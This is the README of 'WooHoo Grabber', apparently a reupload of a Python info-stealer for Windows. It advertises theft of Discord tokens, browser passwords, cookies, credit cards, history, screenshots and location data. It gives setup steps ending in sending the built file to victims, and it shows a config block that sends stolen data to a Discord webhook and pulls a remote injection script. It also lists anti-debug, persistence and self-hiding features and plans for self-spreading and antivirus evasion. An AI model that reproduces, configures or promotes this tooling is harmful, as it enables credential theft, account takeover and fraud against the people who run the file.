
WooHoo Grabber reupload - Jayy

🌐 〢 Content
🔰・Features
🌌・Discord
🎉・Setting up WooHoo Grabber.V2
⚙・Config
🔎・Why choose WooHoo Grabber v2?
🌟・Todo/Enhancements
💎・Premium
📝・Changelog
🤓・Dear skids
🔰 〢 Features
> Anti-vm/Anti-debug
> Add to startup
> Hides itself
> Supports github.com/Rdimo/Discord-Webhook-Protector so webhook can't be deleted or spammed
> Options are configurable
> Pretty Fast Even if it Was Made With Python
> Windows Product Key & Build Info
> IP & Geolocation. (Country, City, Google Maps Location)
> A screenshot of all their monitors
> All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
> Their Passwords & Credit Cards for Discord (updates when they change it)
> All Passwords, Cookies and History from Google
> + More!

📁 〢 Setting up WooHoo Grabber.V2
Install python and add it to path.
Open up main.py with notepad or some other editor
Locate the config at the top of the file and Replace "WEBHOOK_HERE" with your discord webhook
Double Click setup.bat and allow it to finish.
A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
Send the file to victims. 😈
⚙ 〢 Config
If you want to change the config, open up main.py and locate it at the top. There you can configure the following:

config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # if True, it will ping @everyone when someone ran Hazard v2
    'ping_on_run': False,
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
🔎 〢 Why choose WooHoo Grabber v2?
You might be wondering, Why choose this grabber instead of other ones like Mercurial or ItroublveTSC. Without making this a competition Hazard v2 has many advantages over alot of grabbers out there, popular, free and even paid ones. V2 is well maintained and updates gets pushed out on a regular basis making it a non-buggy, clean, and working grabber. V2 was for example the first grabber to bypass and decrypt discords new token encryption and additionally has a injection which also currently is the only working one.

Here are some pros and cons why/why not use Hazard v2 instead of other ones

✔ Pros
⁃ Extremely well maintained, making it a safe choice
⁃ Partly undetected just because it gets updates often
⁃ Easy to use and setup
⁃ Completely free and open source
⁃ Loads of wide spread features not only focused on discord
⁃ Cleans itself up, deleting all traces of itself which suprisingly most others don't
⁃ Supports a webhook protector I made (Discord-Webhook-Protector) making it impossible to delete your webhook
⁃ Even thought it's made in python it's very fast thanks to async and threading
⁃ Clean embed & isn't spammy like others making it less likely to get ratelimited
⁃ Takes feedback and listens to what people want to be added/changed/removed

❌ Cons
⁃ Made in Python making it lose to other grabbers in terms of speed
⁃ Python is an interpreted language, it needs to pack the engine & all dependencies making the file size very big
⁃ Only supports windows 10/11
⁃ Can be pretty easily decompiled (still harder than Mercurial atleast)

In the end it's just up to you to choose what grabber suits you and your needs the best.

🌟 〢 todo/enhancements
overlined = feature got added

Grab Webcam (screenshot?, video?) | Suggestion from CLAYlol
Fake Error (custom message, type, etc...)
File dropper (direct payload link, options: hide it? add to startup? drop location?)
Self spread | Suggestion from FuckingToasters
Grab Wifi passwords | Suggestion from msr8
Better Anti-vm/Anti-debug (check screen size?, more registery checks?, make the lists outbound?)
Exe builder (clean gui, toggable options, compress exe (file size <= 8mb), etc...)
Grab Chrome history | Suggestion from TeteuXD2
Grab Minecraft accessToken | Suggestion from p3tt3
Grab hwid (for manual blacklisting) | Suggestion from p3tt3
Grab more network info (ip, geolocation, etc...) and put in seperate txt file
General info (OS, CPU, GPU, RAM, etc...) and put in seperate txt file
Not adding/on hold:

.doc/.pdf file grabbing | Suggestion from islimafjagjafferi
Metamask Priv Key and seed | Suggestion from Snipeeeey
💎 〢 Premium
WooHoo Grabber is a free software. It will NOT be undetected from antiviruses, or have custom features such as:

Stealing from more browsers (edge, firefox, brave, opera etc..)
Stealing creditcards, addresses, emails, phone numbers, names etc..
Crypto/Wallet stealing
Undetected from antivirus
Obfuscated to a irreversible point
Made in a compiled language (stealers made in python automatically becomes bad)
Multi os support
Loads more
Currently the premium grabber is not out yet, but the goal is that the premium one will be a cheap but powerfull grabber and will have the features listed above 10x. join cheataway and do !buy to see preview of the grabber, free trial will be available so you can try it out and see if you like it.

💭 〢 ChangeLog
v1.8.8 ⋮ 2022-08-01
+ fixed very rare bug were the program would crash if someone had a discord.lnk in the appdata dir

v1.8.7 ⋮ 2022-06-30
+ now grabs minecraft accessToken and the jsons from the .minecraft folder
+ made the zip more cleaner and organized google info in Google folder and Minecraft in Minecraft folder
+ better chrome regex
+ fixed rare bug were the info folder would not get deleted on victims pc

v1.8.6 ⋮ 2022-06-23
- fixed major bug were hazard v2 crashed if it was created with hazard nuker

v1.8.5 ⋮ 2022-06-21
- fixed major typo making whole hazard crash
+ fixed rare KeyError bug were the os_crypt couldn't be found

v1.8.4 ⋮ 2022-06-21
+ now grabs history from google (mostly for catching people lacking on pornhub)
+ added option to ping @everyone when the grabber has been run
+ additional improvements making it slightly faster and more stable

v1.8.3 ⋮ 2022-06-19
+ fixed minor bug were injector would fail to inject (ty akro#0001 for reporting)

v1.8.2 ⋮ 2022-06-15
+ fixed unhandled local state file not found

v1.8.1 ⋮ 2022-06-14
+ now grabs passwords and cookies from all google profiles (default, guest profile, profile 1, profile 2, etc...)
+ cookie format is now correct and can be imported (thank you ilylunar)
+ fixed uncommon bug were the loginvault.db files got sent to the webhook

v1.8.0 ⋮ 2022-06-13
+ fixed an attribute error when grabbing system info

v1.7.9 ⋮ 2022-06-13
- Fixed major bug with the injector

v1.7.8 ⋮ 2022-06-13
+ Made regex for discord-desktop-core to auto counter discord updates

v1.7.7 ⋮ 2022-06-12
+ fixed typo were windows version and windows key were swapped

v1.7.6 ⋮ 2022-06-12
+ network and system info now gets put in a file (Systeminfo.txt)
+ program now exits if the config webhook is empty
+ deletes the folder with all info in it after it's done
+ fixed json decoding bug (utilities.tk denied some people from accessing it, leading to an error)
+ additional formatting

v1.7.5 ⋮ 2022-06-02
+ added another endpoint for network info grabbing since ipinfo.io had a ratelimit (ty https://github.com/mte0 for the new endpoint)
+ added back ram check

v1.7.4 ⋮ 2022-05-31
+ exits if no internet connection was established.
+ made functions match the default regular expression ^[_a-z][a-z0-9_]*$
+ made classes match the default regular expression ^_?([A-Z_][a-zA-Z0-9]*|[a-z_][a-z0-9_]*)$

v1.7.2 ⋮ 2022-05-23
+ fixed bug were discord would still restart even if kill_processes was off

v1.7.1 ⋮ 2022-05-22
+ https://github.com/Rdimo/Discord-Webhook-Protector now works with the injection

v1.7.0 ⋮ 2022-05-22
+ Added support for https://github.com/Rdimo/Discord-Webhook-Protector

v1.6.9 ⋮ 2022-05-16
- Removed my accidently added webhook and enabled the defaults again,

v1.6.8 ⋮ 2022-05-16
+ fixed unpack valueError bug (https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/297)

v1.6.7 ⋮ 2022-05-15
+ fixed TypeError bug were loc could be a NoneType

v1.6.6 ⋮ 2022-05-11
+ updated token regex since discord update the auth token

v1.6.5 ⋮ 2022-05-7
+ bug fixes
+ cleaner code

v1.6.4 ⋮ 2022-05-01
+ anti-vm/debug
+ better encrypted token regex
+ bug fixes

v1.6.3 ⋮ 2022-04-24
+ fixed grab encrypted tokens from other discord versions
+ optimization
+ better handler
+ bug fixes

v1.6.2 ⋮ 2022-04-19
+ fixed decoding
+ better err handling

v1.6.1 ⋮ 2022-04-17
+ updated to discord_desktop_core-3

v1.6.0 ⋮ 2022-04-08
+ config to customize options
+ class object for general functions
+ threads and async functions making it 10x faster
+ decorator for the chrome grabbing functions
+ changed from requests to httpx for async lib
+ grabs disk and ram size
+ better builder
+ cleaner embed
+ formatted code
🤓 〢 Dear Skids
We all know you cant code for shit but skidding peoples hard work, is just not it
Profiting from it is just even more f*cked up
I hope you end up on the streets begging for spare change


🌟 Enjoyed WooHoo Grabber V2? Consider dropping a star :)
Made alone by Jayy
